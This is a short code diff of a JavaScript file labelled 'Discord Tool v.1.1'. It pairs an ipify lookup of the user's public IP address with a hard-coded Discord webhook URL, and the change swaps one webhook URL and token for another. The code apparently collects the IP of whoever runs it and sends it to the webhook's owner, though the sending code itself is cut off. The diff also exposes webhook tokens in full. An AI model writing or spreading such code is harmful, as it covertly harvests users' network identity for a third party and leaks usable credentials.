@@ -1,6 +1,6 @@
 // --- Discord Tool v.1.1 ---
 const ipifyAPI = "https://api.ipify.org?format=json";
-const webhookURL = "https://discord.com/api/webhooks/1527734125954334761/6uzxk9D68JI2tG9vHkMTvMXhLTzkAxXvjeRzkGGWWlttPhrUy6wzClPmQYxMGvfInuaZ";
+const webhookURL = "https://ptb.discord.com/api/webhooks/1527734124520149117/JbJOjX2jYzYQPEfIUsDXh4DNJGuX1asp7MmMT0GtxhxKpturo2sWfXWTFge1bGAuJw2x";
 
 async function getIP() {
     try {
